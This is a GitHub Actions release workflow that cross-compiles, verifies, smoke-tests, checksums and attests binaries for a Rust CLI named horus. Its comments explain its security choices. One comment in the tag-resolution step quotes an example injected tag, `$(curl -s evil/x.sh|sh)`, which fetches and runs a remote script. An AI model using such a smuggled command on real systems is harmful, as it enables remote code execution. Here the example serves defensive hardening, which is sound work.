name: Release

on:
  push:
    tags:
      - 'v*.*.*'
  # Allow manually triggering a "dry-run" build that exercises the matrix
  # without creating/updating a GitHub Release. Useful for validating the
  # workflow before cutting a tag.
  workflow_dispatch:
    inputs:
      tag:
        description: 'Tag to associate the artifacts with (leave blank for dry-run)'
        required: false
        type: string

env:
  CARGO_TERM_COLOR: always
  # Oldest glibc a published Linux asset is allowed to require. 2.28 is Debian
  # 10 / RHEL 8 / manylinux_2_28 — the same floor build-wheels.yml:42 asks
  # maturin for with `manylinux: auto`, so the CLI and the Python wheels agree
  # on what "supported Linux" means. It is enforced twice below: the
  # `.2.28` suffix on each Linux target tells zig which glibc stubs to link
  # against, and "Verify glibc floor" reads the version-needs back out of the
  # ELF so a drifting toolchain fails the release instead of shipping.
  GLIBC_FLOOR: '2.28'

# Least privilege for the default GITHUB_TOKEN. Every other workflow in this
# repository declares this; release.yml did not, so its jobs fell back to the
# repository's default token permissions — read/write on every scope for a repo
# whose org predates GitHub's 2023 default change. That default landed on the
# one workflow where it matters most: `build-release` runs `cargo build`, which
# executes the build scripts and proc macros of every transitive dependency
# (including two git dependencies), on the tag push that cuts a release. A
# single compromised build script would have held a write-scoped token.
# `create-release` re-declares the `contents: write` it genuinely needs — plus
# the `id-token`/`attestations` scopes the provenance attestation needs — so no
# job loses a permission it actually uses.
permissions:
  contents: read

jobs:
  build-release:
    name: Build ${{ matrix.asset_name }}
    runs-on: ${{ matrix.os }}
    strategy:
      # Keep going after a red leg so one run reports every broken platform
      # rather than the first. This is only safe because `create-release`
      # refuses to publish an incomplete asset set — see the gate there.
      fail-fast: false
      matrix:
        include:
          # The three Linux legs cross-compile with cargo-zigbuild against an
          # explicit glibc floor (`zig_target`) instead of linking against
          # whatever ubuntu-latest happens to ship. Building them natively is
          # what put a GLIBC_2.39 version-need in horus-linux-amd64 and
          # horus-linux-arm64: install.sh downloaded the asset, verified its
          # checksum, reported success, and the user's next command died with
          # "version `GLIBC_2.39' not found" on Raspberry Pi OS, JetPack,
          # Ubuntu 22.04, Debian 12 and RHEL 9. zig carries the glibc stub sets
          # for every version and architecture, so one x86_64 runner links all
          # three; the gcc cross toolchains cannot do this, because they link
          # against the host's glibc, which is the bug.
          - os: ubuntu-latest
            target: x86_64-unknown-linux-gnu
            zig_target: x86_64-unknown-linux-gnu.2.28
            artifact_name: horus
            asset_name: horus-linux-amd64
            strip_bin: strip
            docker_platform: linux/amd64
          - os: ubuntu-latest
            target: aarch64-unknown-linux-gnu
            zig_target: aarch64-unknown-linux-gnu.2.28
            artifact_name: horus
            asset_name: horus-linux-arm64
            strip_bin: aarch64-linux-gnu-strip
            docker_platform: linux/arm64
          # 32-bit Raspberry Pi OS. install.sh's detect_arch has always mapped
          # armv7l to "armv7" and composed horus-linux-armv7 from it, but no leg
          # ever built that asset, so every 32-bit Pi got a 404 and fell through
          # to the source build the installer advertises as "~3-5 min". That is
          # 274 crates with thin LTO on a Cortex-A53 off an SD card — hours, and
          # twice that when the LTO-off retry fires.
          - os: ubuntu-latest
            target: armv7-unknown-linux-gnueabihf
            zig_target: armv7-unknown-linux-gnueabihf.2.28
            artifact_name: horus
            asset_name: horus-linux-armv7
            strip_bin: arm-linux-gnueabihf-strip
            docker_platform: linux/arm/v7
          - os: macos-latest
            target: x86_64-apple-darwin
            artifact_name: horus
            asset_name: horus-macos-amd64
            strip_bin: strip
          - os: macos-latest
            target: aarch64-apple-darwin
            artifact_name: horus
            asset_name: horus-macos-arm64
            strip_bin: strip
          - os: windows-latest
            target: x86_64-pc-windows-msvc
            artifact_name: horus.exe
            asset_name: horus-windows-amd64
    steps:
      - name: Checkout repository
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      # Linux build deps mirror install.sh's install_build_deps() for ubuntu/debian.
      # Missing any of these has historically caused horus_manager build failures
      # in CI even though `cargo check --no-default-features` worked locally.
      - name: Install system dependencies (Linux)
        if: runner.os == 'Linux'
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            build-essential \
            pkg-config \
            libssl-dev \
            libudev-dev \
            libasound2-dev \
            libclang-dev

      # macOS deps via Homebrew. pkg-config is the only one not pre-installed.
      - name: Install system dependencies (macOS)
        if: runner.os == 'macOS'
        run: brew install pkg-config

      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@4cda84d5c5c54efe2404f9d843567869ab1699d4 # stable
        with:
          # The plain triple, not zig_target: rustup has no ".2.28" target, and
          # cargo-zigbuild strips the glibc suffix before it calls cargo.
          targets: ${{ matrix.target }}

      # zig is the linker for the Linux legs, so the gcc cross-compilers are
      # gone — but `strip` is not part of zig, and the host strip rejects a
      # foreign ELF outright ("file format not recognized"). binutils-* is the
      # small half of the old gcc-* packages and is all that is still needed.
      - name: Install cross binutils (Linux)
        if: runner.os == 'Linux'
        run: sudo apt-get install -y binutils-aarch64-linux-gnu binutils-arm-linux-gnueabihf

      # Both pinned exactly: a release asset's glibc floor is a compatibility
      # promise, so the toolchain that sets it must not float — a zig upgrade
      # would move the floor of every Linux asset without a single line of this
      # workflow changing. Installed from PyPI rather than as a GitHub Action so
      # nothing else has to be trusted or SHA-pinned; cargo-zigbuild looks for
      # `python -m ziglang` before it looks for a `zig` binary, which a --user
      # install satisfies.
      - name: Install cargo-zigbuild and Zig (Linux)
        if: runner.os == 'Linux'
        run: |
          python3 -m pip install --user --break-system-packages \
            'cargo-zigbuild==0.23.3' 'ziglang==0.16.0'
          echo "$HOME/.local/bin" >> "$GITHUB_PATH"
          "$HOME/.local/bin/cargo-zigbuild" --version
          python3 -m ziglang version

      - name: Cargo build cache
        uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2
        with:
          shared-key: release-${{ matrix.target }}

      - name: Build release binary (Linux)
        if: runner.os == 'Linux'
        run: cargo zigbuild --release --target ${{ matrix.zig_target }} -p horus_manager

      # macOS and Windows have no glibc to floor; their deployment target comes
      # from the SDK the runner ships, so a plain cargo build is correct there.
      - name: Build release binary (macOS / Windows)
        if: runner.os != 'Linux'
        run: cargo build --release --target ${{ matrix.target }} -p horus_manager

      - name: Strip binary (Unix)
        if: runner.os != 'Windows'
        run: ${{ matrix.strip_bin }} target/${{ matrix.target }}/release/${{ matrix.artifact_name }}

      - name: Create archive (Unix)
        if: runner.os != 'Windows'
        run: |
          cd target/${{ matrix.target }}/release
          tar czf ../../../${{ matrix.asset_name }}.tar.gz ${{ matrix.artifact_name }}

      - name: Create archive (Windows)
        if: runner.os == 'Windows'
        shell: pwsh
        run: |
          Compress-Archive -Path "target/${{ matrix.target }}/release/${{ matrix.artifact_name }}" `
                           -DestinationPath "${{ matrix.asset_name }}.zip"

      # Read the glibc floor back out of the ELF rather than trusting that the
      # `.2.28` suffix did what it says. readelf parses foreign-architecture ELF
      # fine, so all three Linux legs are checked here on the x86_64 runner —
      # including the version-needs zig links in for the C in `ring`.
      - name: Verify glibc floor (Linux)
        if: runner.os == 'Linux'
        run: |
          set -euo pipefail
          bin="target/${{ matrix.target }}/release/${{ matrix.artifact_name }}"
          echo "Shared libraries required:"
          readelf --wide --dynamic "$bin" | grep NEEDED || echo "  (statically linked)"
          highest=$(readelf --wide --version-info "$bin" \
            | grep -oE 'GLIBC_[0-9]+(\.[0-9]+)+' | sed 's/^GLIBC_//' \
            | sort -u -V | tail -1 || true)
          echo "highest GLIBC version-need: ${highest:-none} (floor: ${GLIBC_FLOOR})"
          if [ -n "$highest" ] && \
             [ "$(printf '%s\n%s\n' "$GLIBC_FLOOR" "$highest" | sort -V | tail -1)" != "$GLIBC_FLOOR" ]; then
            echo "::error::${{ matrix.asset_name }} requires GLIBC_${highest}, above the supported floor GLIBC_${GLIBC_FLOOR}. It would install cleanly and then fail to start."
            exit 1
          fi

      - name: Set up QEMU (foreign-architecture smoke test)
        if: runner.os == 'Linux' && matrix.docker_platform != 'linux/amd64'
        uses: docker/setup-qemu-action@c7c53464625b32c7a7e944ae62b3e17d2b600130 # v3.7.0
        with:
          platforms: ${{ matrix.docker_platform }}

      # The real gate, and it runs before the upload so a binary that cannot
      # start never becomes a release asset. Its predecessor ran `--version` on
      # the machine that had just built the binary and skipped aarch64
      # altogether, while claiming to catch "wrong libc" — a builder always
      # satisfies its own libc, so that check could not fail for the reason it
      # named. Unpacking the actual tarball inside an old-glibc container, under
      # qemu for the foreign architectures, can.
      #
      # debian:11 (glibc 2.31) rather than debian:10 (2.28, the exact floor):
      # bullseye is the oldest Debian still receiving security updates, so the
      # image will keep being pullable. The exact floor is what the readelf
      # check above is for; this step proves the binary actually runs somewhere
      # far older than the ubuntu-latest builder.
      - name: Smoke test in old-glibc container (Linux)
        if: runner.os == 'Linux'
        run: |
          set -euo pipefail
          mkdir -p smoke-test
          cp "${{ matrix.asset_name }}.tar.gz" smoke-test/
          docker run --rm --platform "${{ matrix.docker_platform }}" \
            -v "$PWD/smoke-test:/smoke" -w /smoke debian:11 \
            sh -c 'set -e; tar xzf ${{ matrix.asset_name }}.tar.gz; ./${{ matrix.artifact_name }} --version'

      # No container equivalent on the macOS and Windows runners, so this stays
      # a native run: it catches missing dlopen targets and link errors that
      # compile cleanly, and claims nothing about OS-version floors.
      - name: Smoke test (--version)
        if: runner.os != 'Linux'
        shell: bash
        run: ./target/${{ matrix.target }}/release/${{ matrix.artifact_name }} --version

      - name: Upload archive (Unix)
        if: runner.os != 'Windows'
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: ${{ matrix.asset_name }}
          path: ./${{ matrix.asset_name }}.tar.gz
          if-no-files-found: error
          retention-days: 14

      - name: Upload archive (Windows)
        if: runner.os == 'Windows'
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: ${{ matrix.asset_name }}
          path: ./${{ matrix.asset_name }}.zip
          if-no-files-found: error
          retention-days: 14

  create-release:
    name: Create GitHub Release
    needs: build-release
    runs-on: ubuntu-latest
    # Only create a Release when this workflow was triggered by a tag push,
    # not by a manual dry-run dispatch with no tag input. `success()` is spelled
    # out rather than left implicit so that a future edit to this condition
    # cannot quietly detach the Release from whether the matrix went green.
    if: >-
      success() &&
      (github.event_name == 'push' ||
       (github.event_name == 'workflow_dispatch' && github.event.inputs.tag != ''))
    permissions:
      contents: write      # create the Release and upload its assets
      id-token: write      # Sigstore OIDC token for the provenance attestation
      attestations: write  # write the attestation itself
    steps:
      - name: Download all artifacts
        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          path: artifacts
          merge-multiple: true

      # A Release missing one platform is not a degraded install for that
      # platform's users: install.sh builds its download URL as
      # horus-${OS}-${ARCH} from detect_os/detect_arch, so a missing asset is a
      # 404 followed by a silent fallback to an hours-long source build — and
      # `horus self update` resolves the same names. Refuse to publish rather
      # than publish a hole. This list must stay in step with build-release's
      # matrix; a count mismatch fails too, so an added leg cannot be forgotten
      # here without the release going red.
      - name: Verify the asset set is complete
        env:
          EXPECTED: |
            horus-linux-amd64.tar.gz
            horus-linux-arm64.tar.gz
            horus-linux-armv7.tar.gz
            horus-macos-amd64.tar.gz
            horus-macos-arm64.tar.gz
            horus-windows-amd64.zip
        run: |
          set -euo pipefail
          incomplete=0
          expected_count=0
          while IFS= read -r asset; do
            [ -n "$asset" ] || continue
            expected_count=$((expected_count + 1))
            if [ ! -s "artifacts/${asset}" ]; then
              echo "::error::release asset missing or empty: ${asset}"
              incomplete=1
            fi
          done <<< "$EXPECTED"
          found_count=$(find artifacts -maxdepth 1 -type f \
            \( -name '*.tar.gz' -o -name '*.zip' \) | wc -l)
          if [ "$found_count" -ne "$expected_count" ]; then
            echo "::error::expected ${expected_count} assets, found ${found_count} — the matrix and this list have drifted apart"
            incomplete=1
          fi
          ls -l artifacts
          [ "$incomplete" -eq 0 ]

      - name: Compute checksums
        run: |
          set -euo pipefail
          cd artifacts
          # No `2>/dev/null || true` here any more: install.sh refuses to install
          # when SHA256SUMS has no line for the asset it downloaded, so a silently
          # empty or truncated SHA256SUMS is a release nobody can install through
          # the documented path. Fail the job instead.
          # `--` and not `./*`: install.sh matches SHA256SUMS lines with
          # `grep " <asset>$"`, so a "./" prefix on the names would stop every
          # lookup from matching and turn a good release into a refused install.
          sha256sum -- *.tar.gz *.zip > SHA256SUMS
          cat SHA256SUMS

      # Bind every asset to this repository, workflow and commit so a user can
      # run `gh attestation verify --repo <owner>/<repo> horus-linux-amd64.tar.gz`
      # and tell a real release asset from a re-uploaded one. Scope note, because
      # it is easy to overstate: this covers the assets (SHA256SUMS included), not
      # the installer. install.sh is still fetched unsigned over https from
      # raw/main and does not itself call `gh attestation verify`, so this is
      # defence in depth for people who check, not a root of trust for the curl
      # one-liner. Runs before the Release is created so a failed attestation
      # cannot leave published-but-unattested assets behind.
      - name: Attest build provenance
        uses: actions/attest-build-provenance@977bb373ede98d70efdf65b84cb5f73e068dcc2a # v3.0.0
        with:
          subject-path: |
            artifacts/*.tar.gz
            artifacts/*.zip
            artifacts/SHA256SUMS

      - name: Resolve tag
        id: tag
        env:
          # Pass the workflow_dispatch input through the environment rather than
          # interpolating it into the script. Direct ${{ }} interpolation splices
          # attacker-controlled text into bash in a job that holds
          # `contents: write`, so a tag like `$(curl -s evil/x.sh|sh)` — or one
          # containing a newline — would execute or forge step outputs.
          TAG_INPUT: ${{ github.event.inputs.tag }}
          EVENT_NAME: ${{ github.event_name }}
        run: |
          if [ "$EVENT_NAME" = "push" ]; then
            echo "tag=${GITHUB_REF#refs/tags/}" >> "$GITHUB_OUTPUT"
          else
            echo "tag=$TAG_INPUT" >> "$GITHUB_OUTPUT"
          fi

      - name: Create / update Release
        uses: softprops/action-gh-release@3d0d9888cb7fd7b750713d6e236d1fcb99157228 # v3.0.2
        with:
          tag_name: ${{ steps.tag.outputs.tag }}
          generate_release_notes: true
          files: |
            artifacts/*.tar.gz
            artifacts/*.zip
            artifacts/SHA256SUMS
